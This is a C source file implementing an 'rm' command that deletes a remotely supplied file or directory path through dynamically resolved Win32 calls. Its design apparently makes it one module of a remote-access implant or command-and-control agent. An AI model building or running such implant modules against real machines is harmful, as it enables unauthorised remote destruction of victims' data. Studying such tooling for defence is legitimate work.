#include "config.h"
#ifdef INCLUDE_CMD_RM

#include "commands.h"

VOID cmd_rm(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD path_len = 0;
    char* path = parser_string(args, &path_len);
    if (!path || path_len == 0) {
        package_add_string(inst, response, XSTR("Usage: rm <path>"));
        response->is_error = TRUE;
        return;
    }

    char pathbuf[MAX_PATH] = {0};
    es_memcpy(pathbuf, path, path_len < MAX_PATH-1 ? path_len : MAX_PATH-1);

    DWORD attrs = inst->Win32.GetFileAttributesA(pathbuf);
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        package_add_string(inst, response, XSTR("Path not found"));
        response->is_error = TRUE;
        return;
    }

    BOOL ok;
    if (attrs & FILE_ATTRIBUTE_DIRECTORY)
        ok = inst->Win32.RemoveDirectoryA(pathbuf);
    else
        ok = inst->Win32.DeleteFileA(pathbuf);

    if (ok) {
        package_add_string(inst, response, XSTR("Removed"));
    } else {
        package_add_string(inst, response, XSTR("Failed to remove"));
        response->is_error = TRUE;
    }
}

#endif
